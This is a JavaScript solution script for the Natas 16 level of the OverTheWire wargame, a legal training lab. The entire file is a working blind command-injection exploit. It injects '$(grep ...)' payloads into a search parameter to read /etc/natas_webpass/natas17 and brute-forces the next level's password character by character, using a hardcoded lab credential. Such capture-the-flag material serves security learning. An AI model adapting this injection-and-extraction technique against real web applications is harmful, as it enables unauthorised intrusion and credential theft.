(function () {
  let request = require('request'),
      url = "natas16.natas.labs.overthewire.org/",
      username = "natas16",
      password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
      chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
      filtered = [],
      pass = '',
      uri = `http://${username}:${password}@${url}index.php`;


  for( let i = 0; i < chars.length; i += 1 ) {
    let char = chars[i];
  request(
    {
      url: uri,
      qs: {
        needle: `$(grep ${char} /etc/natas_webpass/natas17)`,
        submit: "Search"
      }
    },(function(c,i) { return function(error, response, body) {
      if( error ) { return console.log( error ); };
      if( !body.match('iris') ) {
        filtered[i] = c;
      };
    };
    })( char, i ));
  };
  setTimeout(() => {
    let filter = filtered.join('');
    console.log( "This is the filter used: " + filter );
    let index = 0;
    recurse( index, filter );
  }, 2000);
  function recurse( index, list ) {
    let char = list[index];
    request(
      {
        url: uri,
        qs: {
          needle: `$(grep -E ^${pass}${char} /etc/natas_webpass/natas17)`,
          submit: "Search"
        }
      },(error, response, body) => {
        if( error ) { console.log( error ); };
        if( !body.match('iris') ) {
          pass += char;
          if( pass.length === 32 ) {
            console.log( pass );
            console.log( "DONE!" );
          } else {
            index = 0;
            console.log( pass );
            recurse( index, list );
          }
        } else {
          index += 1;
          recurse( index, list );
        };
      });
  };
})()
